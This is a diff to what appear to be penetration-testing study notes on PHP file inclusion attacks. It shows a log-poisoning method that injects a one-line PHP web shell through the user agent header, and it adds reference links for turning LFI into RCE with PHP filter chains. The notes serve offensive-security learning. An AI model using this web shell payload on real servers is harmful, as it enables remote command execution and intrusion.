@@ -74,10 +74,13 @@ Log Poisoning
 	open: /log/apache2/access.log 
 	send payload as user agent string: <?php system($_GET['cmd']); ?>    
 	/log/apache2/access.log&cmd=id  
-	
+### LFI to RCE via PHP Filters        
+If you think the input is being passed to a PHP include or require function.      
+[Hacktricks LFI to RCE Using PHP Filters](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)    	
 ## Remote File Inclusion 
 Turning LFI to RFI: https://l.avala.mp/?p=241
-[Reference](https://sushant747.gitbooks.io/total-oscp-guide/content/remote_file_inclusion.html)  
+[Reference](https://sushant747.gitbooks.io/total-oscp-guide/content/remote_file_inclusion.html)     
+https://github.com/synacktiv/php_filter_chain_generator   
 
 ## Web Payloads 
 
